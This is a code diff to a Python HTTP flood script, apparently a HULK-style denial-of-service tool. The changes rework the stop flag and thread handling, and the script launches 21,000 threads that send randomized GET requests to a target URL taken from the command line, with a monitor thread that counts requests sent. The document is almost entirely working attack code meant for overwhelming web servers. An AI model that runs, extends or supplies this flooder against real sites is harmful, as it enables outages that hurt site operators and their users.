@@ -13,7 +13,8 @@ host = ''
 headers_useragents = []
 headers_referers = []
 request_counter = 0
-flag = False
+flag = 0
+threads = []
 
 isp_blocks = ['192.168.0.0/24', '10.0.0.0/8', '172.16.0.0/12']
 real_ips = ['192.168.0.1', '10.0.0.1', '172.16.0.1']
@@ -52,7 +53,7 @@ def inc_counter():
 
 def stop_attack():
     global flag
-    flag = True
+    flag = 2
 
 def httpcall(url):
     request_url = url + ("&" if url.count("?") > 0 else "?") + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
@@ -80,26 +81,20 @@ def httpcall(url):
         inc_counter()
 
 class HTTPThread(threading.Thread):
-    def __init__(self):
-        super().__init__()
-        self.daemon = True
-
     def run(self):
-        while not flag:
+        while flag < 2:
             httpcall(url)
+            time.sleep(random.uniform(0.1, 0.5))
 
 class MonitorThread(threading.Thread):
-    def __init__(self):
-        super().__init__()
-        self.daemon = True
-
     def run(self):
         previous = request_counter
-        while not flag:
+        while flag == 0:
             if previous + 1000 < request_counter and previous != request_counter:
                 print(f"{request_counter} Requests Sent")
                 previous = request_counter
-        print("\n-- Attack stopped by user --")
+        if flag == 2:
+            print("\n-- Attack stopped by user --")
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
@@ -110,23 +105,15 @@ if __name__ == "__main__":
         url += "/"
     m = re.search('(https?://)?([^/]*)/?.*', url)
     host = m.group(2)
-    threads = []
+    for i in range(21000):
+        t = HTTPThread()
+        t.start()
+        threads.append(t)
+    monitor = MonitorThread()
+    monitor.start()
+    threads.append(monitor)
     try:
-        while True:
-            for i in range(21000):
-                if flag:
-                    break
-                t = HTTPThread()
-                t.start()
-                threads.append(t)
-            time.sleep(7)
-            flag = True
-            for t in threads:
-                t.join()
-            flag = False
-            request_counter = 0
-            threads.clear()
-    except KeyboardInterrupt:
-        stop_attack()
         for t in threads:
             t.join()
+    except KeyboardInterrupt:
+        stop_attack()
